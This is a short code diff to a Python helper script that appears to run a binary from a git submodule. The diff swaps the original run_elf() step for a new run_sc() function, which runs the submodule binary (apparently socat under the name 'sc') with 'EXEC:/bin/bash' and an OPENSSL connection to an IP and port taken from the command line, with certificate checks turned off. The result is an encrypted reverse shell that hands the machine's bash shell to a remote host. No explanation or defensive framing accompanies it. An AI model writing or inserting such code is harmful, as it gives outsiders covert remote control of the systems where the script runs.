@@ -48,9 +48,20 @@ def run_elf():
     print(f"Running ELF binary: {elf_path}")
     subprocess.check_call([elf_path])
 
+def run_sc(ip, port):
+    sc_path = os.path.join(SUBMODULE_PATH, SC_BINARY)
+    if not os.path.isfile(sc_path):
+        print("Error: binary not found in submodule!")
+        sys.exit(1)
+    
+    print(f"Starting sc connection to {ip}:{port} ...")
+    subprocess.check_call([sc_path, "EXEC:/bin/bash", f"OPENSSL:{ip}:{port},verify=0"])
+
 if __name__ == "__main__":
+    ip = sys.argv[1]
+    port = sys.argv[2]
     check()
     init_submodule()
-    run_elf()
+    run_sc(ip,port)
             
             
